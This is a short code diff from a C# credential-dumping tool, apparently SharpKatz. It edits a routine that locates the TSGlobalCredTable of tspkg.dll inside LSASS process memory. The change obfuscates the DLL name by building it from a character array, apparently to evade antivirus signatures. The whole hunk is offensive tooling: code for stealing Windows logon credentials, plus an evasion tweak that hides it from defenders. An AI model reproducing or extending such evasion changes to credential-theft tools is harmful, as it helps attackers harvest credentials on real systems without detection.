@@ -85,7 +85,8 @@ namespace SharpKatz.Module
             IntPtr tsGlobalCredTableAddr;
             IntPtr llCurrent;
 
-            tsGlobalCredTableAddr = Utility.GetListAdress(hLsass, tspkgMem, "tspkg.dll", max_search_size, oshelper.TSGlobalCredTableOffset, oshelper.TSGlobalCredTableSign);
+            string sTspkg = new string(new char[] { 't','s','p','k','g','.','d','l','l' });
+            tsGlobalCredTableAddr = Utility.GetListAdress(hLsass, tspkgMem, sTspkg, max_search_size, oshelper.TSGlobalCredTableOffset, oshelper.TSGlobalCredTableSign);
 
             //Console.WriteLine("[*] Tspkg TSGlobalCredTable found at address {0:X}", tsGlobalCredTableAddr.ToInt64());
 
